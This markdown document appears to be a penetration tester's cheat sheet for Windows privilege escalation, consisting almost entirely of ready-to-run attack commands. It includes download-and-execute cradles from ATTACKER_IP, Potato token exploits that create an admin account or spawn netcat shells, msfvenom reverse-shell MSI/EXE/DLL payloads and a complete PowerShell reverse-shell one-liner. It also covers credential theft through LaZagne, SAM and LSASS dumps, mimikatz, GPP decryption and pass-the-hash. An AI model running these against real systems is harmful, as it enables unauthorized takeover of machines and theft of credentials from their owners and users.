---
tags: [got-shell-windows, windows, privesc, impersonate, service, scheduled-task, gpp, sebackup]
---

# Windows Privilege Escalation

Run winPEAS first, then manually check this list in parallel.

> **Chains:** Domain-joined machine → also work [06_active_directory.md](./06_active_directory.md) in parallel | Internal port found (netstat -ano) → [07_pivoting.md](./07_pivoting.md) | Creds found → [00_master_checklist.md Phase 4](./00_master_checklist.md) — spray | SYSTEM obtained → [00_master_checklist.md Phase 7](./00_master_checklist.md) — dump & pivot

---

## Automated Tools

```powershell
# Transfer and run winPEAS
.\winPEASany.exe | Tee-Object C:\Windows\Temp\wp.out
.\winPEAS.ps1

# PowerShell download cradle
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/winPEAS.ps1')

# Seatbelt
.\Seatbelt.exe -group=all

# PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
Invoke-AllChecks
```

---

## Quick Triage (run immediately)

```cmd
whoami
whoami /all
whoami /priv
net user %username%
net localgroup administrators
systeminfo
hostname
ipconfig /all
netstat -ano
```

```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath  # then read that file
```

---

## 1 — Token Privileges (SeImpersonatePrivilege)

```cmd
whoami /priv
```

If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled:

```powershell
# GodPotato (works on Windows Server 2012-2022)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"

# PrintSpoofer (Windows 10/Server 2019+)
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "nc.exe ATTACKER_IP PORT -e cmd"

# JuicyPotato (Windows < Server 2019)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

# SweetPotato
.\SweetPotato.exe -e EfsRpc -p .\nc.exe -a "ATTACKER_IP PORT -e cmd"
```

---

## 2 — AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be set to 1. Then:

```bash
# On attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o evil.msi

# On target
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

---

## 3 — Service Binary Hijacking

```powershell
# Find services with weak permissions
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Check permissions on service binary
icacls "C:\path\to\service.exe"
# Look for: BUILTIN\Users:(F) or (W) or (M)

# Also check with PowerUp
Get-ModifiableServiceFile

# Exploit: replace binary with reverse shell
copy evil.exe "C:\path\to\service.exe"
sc stop ServiceName
sc start ServiceName
# Or wait for reboot / restart
```

---

## 4 — Unquoted Service Path

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """
sc qc ServiceName
```

If path like `C:\Program Files\Some App\service.exe` (no quotes):
Windows tries: `C:\Program.exe`, `C:\Program Files\Some.exe`, etc.

```bash
# On attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o Program.exe

# On target
copy Program.exe "C:\Program.exe"
sc start ServiceName
```

---

## 5 — Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status\|task to run"

# PowerShell
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Format-List TaskName,Actions,Triggers,Principal
```

Check if the executable in the task is writable:

```cmd
icacls "C:\path\to\task\executable.exe"
```

---

## 6 — Stored Credentials

```cmd
# Saved creds (cmdkey)
cmdkey /list
runas /savecred /user:Administrator cmd.exe

# Registry credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
# LaZagne — dumps credentials from browsers, apps, Windows vaults
.\lazagne.exe all
.\lazagne.exe browsers        # Chrome, Firefox, IE saved passwords
.\lazagne.exe windows         # Windows credential manager, LSA secrets

# Manual browser credential paths (Chrome)
# %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data  (SQLite)
# Encrypted with DPAPI — LaZagne handles decryption automatically
```

---

## 7 — DLL Hijacking

```powershell
# Find missing DLLs with PowerUp
Find-ProcessDLLHijack
Find-PathDLLHijack

# Check DLL search order for running processes
# Procmon on attacker (optional), or check PATH
echo %PATH%
```

```bash
# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f dll -o evil.dll
```

---

## 8 — PowerShell History & Credential Files

```powershell
# PowerShell history
(Get-PSReadlineOption).HistorySavePath
Get-History

# Look for .cred or .xml files (encrypted PSCredential)
Get-ChildItem -Path C:\Users -Include *.cred,*.xml -Recurse -ErrorAction SilentlyContinue

# Unifi credential files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# All txt/ini files under Users
Get-ChildItem -Path C:\Users\ -Include *.txt,*.ini,*.config -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "pass|cred|key" -SimpleMatch
```

---

## 9 — GPP / cpassword (domain-joined machines)

If the machine is domain-joined, SYSVOL is readable by all domain users.

```powershell
# Search SYSVOL for stored passwords
findstr /S /I cpassword \\$DOMAIN\sysvol\$DOMAIN\Policies\*.xml

# PowerSploit
Get-GPPPassword
```

```bash
# Decrypt on Linux
gpp-decrypt <cpassword_value>

# Or with nxc/crackmapexec from your attacker box
nxc smb $DC_IP -u user -p password -M gpp_password
nxc smb $DC_IP -u user -p password -M gpp_autologin
```

---

## 10 — SAM / SYSTEM Dump (if admin/backup op rights)

```cmd
# Backup SAM and SYSTEM
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Then transfer and extract hashes on Linux:
# impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

---

## 10b — SeBackupPrivilege

**Look for:** `whoami /priv` shows `SeBackupPrivilege` — Enabled. Common on service accounts and backup operators.

**What it gives you:** Read any file on the system regardless of ACL. Use it to copy SAM/SYSTEM hives → extract hashes → PTH or crack.

```cmd
:: Check
whoami /priv | findstr /i "SeBackupPrivilege"

:: Copy SAM/SYSTEM (reg save works because backup privilege bypasses ACL)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
:: Transfer to attacker, then:
:: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

If you're on a DC, you can also extract ntds.dit via diskshadow + robocopy or wbadmin.
**Google:** `SeBackupPrivilege ntds.dit diskshadow` / `SeBackupPrivilege wbadmin`

---

## 11 — SeDebugPrivilege

```cmd
whoami /priv | findstr /i "SeDebugPrivilege"
```

`SeDebugPrivilege` lets you read/write memory of any process including LSASS. Common on developer accounts and some service accounts.

```powershell
# Dump LSASS memory (transfer .dmp to attacker then extract hashes)
.\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Parse on attacker (Linux)
# pypykatz lsa minidump lsass.dmp
# impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Mimikatz directly (if present and not AV-flagged)
privilege::debug
sekurlsa::logonpasswords

# Task Manager alternative (GUI only)
# Task Manager → Details → right-click lsass.exe → "Create dump file"
```

> **→ Hashes obtained:** PTH with evil-winrm / psexec → [06_active_directory.md](./06_active_directory.md) Phase 6

---

## 12 — Installed Software / Vulnerable Apps

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion

# cmd
wmic product get name,version,installdate
```

Cross-reference versions with:

```bash
searchsploit "<software name> <version>"
```

---

## 13 — Access Token Manipulation (with existing admin hash)

```bash
# Pass the Hash
evil-winrm -i $TARGET -u Administrator -H NTLM_HASH
crackmapexec smb $TARGET -u Administrator -H NTLM_HASH
impacket-psexec Administrator@$TARGET -hashes :NTLM_HASH
impacket-wmiexec Administrator@$TARGET -hashes :NTLM_HASH
```

---

## Decision Tree

```
Got low-priv shell
├── whoami /priv → SeImpersonatePrivilege? → GodPotato/PrintSpoofer (section 1)
├── whoami /priv → SeDebugPrivilege? → LSASS dump (section 11)
├── whoami /priv → SeBackupPrivilege? → SAM dump (section 10b)
├── AlwaysInstallElevated both 1? → MSI reverse shell (section 2)
├── cmdkey /list → saved creds? → runas /savecred (section 6)
├── Browser/app credentials? → LaZagne (section 6)
├── Writable service binary? → replace with reverse shell (section 3)
├── Unquoted service path + writable dir? → drop executable (section 4)
├── Writable scheduled task file? → replace executable (section 5)
├── Credentials in registry/history/files? → spray against services (section 6)
├── DLL hijacking opportunity? → plant malicious DLL (section 7)
├── Domain-joined? → check SYSVOL for GPP/cpassword (section 9)
└── Installed software with known CVE? → searchsploit (section 12)
```

---

## Common Reverse Shell Payloads

```bash
# msfvenom exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o shell-svc.exe

# PowerShell one-liner (on attacker: start nc listener)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
